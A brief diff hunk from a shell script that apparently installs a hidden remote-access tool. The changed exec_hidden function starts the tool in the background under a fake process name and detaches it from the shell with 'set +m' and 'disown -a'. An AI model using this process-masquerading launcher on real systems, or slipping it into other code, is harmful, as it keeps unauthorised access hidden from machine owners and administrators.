@@ -330,7 +330,8 @@ install_system_rclocal(){
 }
 
 exec_hidden() {
-	HOME=$HOME TERM="xterm-256color" SHELL=$SHELL QS_ARGS="-l -i -q -s $S" exec -a ${PROC_HIDDEN_NAME} ${QS_PATH} &
+	set +m; TERM="xterm-256color" QS_ARGS="-liqs $S" exec -a ${PROC_HIDDEN_NAME} ${QS_PATH} &
+	disown -a &> $ERR_LOG
 }
 
 install_user() {
